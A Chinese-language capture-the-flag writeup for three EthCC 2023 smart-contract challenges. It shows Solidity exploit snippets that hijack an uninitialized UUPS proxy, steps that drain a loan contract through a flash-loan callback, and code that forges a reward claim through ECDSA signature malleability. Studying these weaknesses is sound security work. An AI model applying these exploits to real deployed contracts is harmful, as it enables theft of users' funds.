# Writeup

refer to [Repo](https://github.com/Snooowgh/warroom-ethcc-2023)

## 1. Proxy

题目要求其他人无法接管合约的implementation
Proxy合约未被初始化, 任何人可以获取owner权限
步骤如下:

- 调用initialize函数成为owner
- 调用whitelistUser函数加入到白名单中
- 调用withdraw函数提取 2 wei ETH
- 调用upgradeTo函数升级合约到自定义的空合约(UUPSUpgradeable合约函数)

```solidity
address(proxy).call{value: 0.1 ether}(
    abi.encodeWithSignature("initialize(address)", address(0))
);
address(proxy).call(
abi.encodeWithSignature("whitelistUser(address)", attacker)
);
address(proxy).call(
abi.encodeWithSignature("withdraw(uint256)", 2)
);
Blank blank = new Blank();
address(proxy).call(
abi.encodeWithSignature("upgradeTo(address)", address(blank))
);

```

## 2. Flash Loan

编写攻击合约, 实现IFlashLoanSimpleReceiver的方法,
通过调用AAVE池子的flashLoan函数获取大量DAI,
然后将资金转移到loan合约中,
再触发AAVE池子的flashLoan函数, 接收合约设置为loan合约,
触发loan合约的回调, 作为initiator获取到totalLoans额度,
接着调用removeLoan函数获取所有奖励, 把奖励转给攻击地址
最后归还借款

```
// 需要用到aave测试网络的部署合约
forge test --match-contract LoanTest -vvvv --fork-url https://eth-sepolia.g.alchemy.com/v2/XXX
```

## 3. Signature malleability

claim奖励需要用户是白名单地址, 且能提供未使用的签名,
题目给出了之前的白名单用户使用过的签名
使用"数学魔法"(⚡️)用旧签名构造新的且有效的签名

数学原理:https://github.com/kadenzipfel/smart-contract-vulnerabilities/blob/master/vulnerabilities/signature-malleability.md

- 椭圆曲线X轴对称, 一个签名一定有另一个对称值
- 如果(r, s)有效, 则(r, -s mod n)也有效

```solidity
// The following is math magic to invert the signature and create a valid one
// flip s (secp256k1 curve)
bytes32 s2 = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));

// invert v
uint8 v2;
require(v == 27 || v == 28, "invalid v");
v2 = v == 27 ? 28 : 27;

vm.prank(user);
rewards.claim(user, whitelistedAmount, v2, r, s2);
```

案例:https://github.com/tendermint/tendermint/issues/1958
